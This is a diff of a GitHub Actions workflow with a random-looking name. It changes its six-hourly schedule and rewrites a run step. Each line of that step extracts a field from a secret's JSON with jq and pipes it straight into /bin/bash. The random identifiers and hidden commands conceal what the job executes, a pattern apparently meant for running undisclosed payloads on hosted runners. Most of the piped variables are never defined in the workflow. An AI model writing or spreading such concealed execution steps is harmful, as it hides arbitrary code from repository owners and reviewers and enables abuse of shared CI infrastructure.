@@ -2,9 +2,8 @@ name: definitelyspinach
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
-
-jobs:  # 5585
+    - cron: '55 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +11,18 @@ jobs:  # 5585
       - uses: actions/checkout@v4
       - name: definitelyspinach
         env:
-          nofxs1710: ${{ secrets.nofxs1710 }}
+          glpsm6397: ${{ secrets.glpsm6397 }}
         run: |
-          echo $nofxs1710 | jq -r .csbhe95 | /bin/bash
-          echo $hmhk72813 | jq -r .vsgm66 | /bin/bash
-          echo $nhs210 | jq -r .wug4 | /bin/bash
-          echo $l98 | jq -r .j51795 | /bin/bash
-          echo $rgx3 | jq -r .ywnu06 | /bin/bash
-          echo $wsvd996 | jq -r .gpq2504 | /bin/bash
-          echo $i1 | jq -r .rrro656 | /bin/bash
-          echo $vepr6 | jq -r .ct76240 | /bin/bash
-          echo $vx71793 | jq -r .thy00 | /bin/bash
-          echo $yjqzm5 | jq -r .wnp3826 | /bin/bash
-          echo $gfol9213 | jq -r .wdzkf57879 | /bin/bash
-          echo $trnyw802 | jq -r .wqu01552 | /bin/bash
-          echo $xyve8 | jq -r .g3602 | /bin/bash
+          echo $glpsm6397 | jq -r .rma300 | /bin/bash
+          echo $az827 | jq -r .ow289 | /bin/bash
+          echo $gd6 | jq -r .x389 | /bin/bash
+          echo $mmb80522 | jq -r .ns6597 | /bin/bash
+          echo $wmj28 | jq -r .vbsus504 | /bin/bash
+          echo $fbu29 | jq -r .kpia09190 | /bin/bash
+          echo $xbxy1851 | jq -r .c57 | /bin/bash
+          echo $vhjie59835 | jq -r .dskk2455 | /bin/bash
+          echo $chqn77257 | jq -r .isw0 | /bin/bash
+          echo $sv104 | jq -r .rty105 | /bin/bash
+          echo $umkvj610 | jq -r .ddkc221 | /bin/bash
+          echo $eenzq07499 | jq -r .yuy6 | /bin/bash
 
